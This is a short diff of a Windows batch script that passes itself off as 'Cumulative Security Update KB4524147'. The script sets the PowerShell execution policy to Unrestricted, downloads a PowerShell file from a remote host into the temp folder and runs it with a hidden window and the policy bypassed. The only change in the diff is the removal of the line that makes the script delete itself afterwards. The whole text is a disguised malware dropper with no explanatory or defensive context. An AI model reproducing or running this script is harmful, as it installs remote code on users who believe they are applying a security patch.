@@ -5,7 +5,6 @@ color 0E && title Cumulative Security Update KB4524147 && powershell Get-HotFix
 cmd /R echo A | powershell Set-ExecutionPolicy Unrestricted -Scope CurrentUser
 powershell -C (New-ObjeCt Net.WebClient).DownloadFile('http://CharlieBrown/Update-KB4524147.ps1', '%tmp%\Update-KB4524147.ps1')
 cd %tmp% && powershell -Execution Bypass -windowstyle hidden -NoProfile -File %tmp%\Update-KB4524147.ps1
-Timeout /T 2 >nul && Del /F /Q Update-KB4524147.bat
 exit
 
 
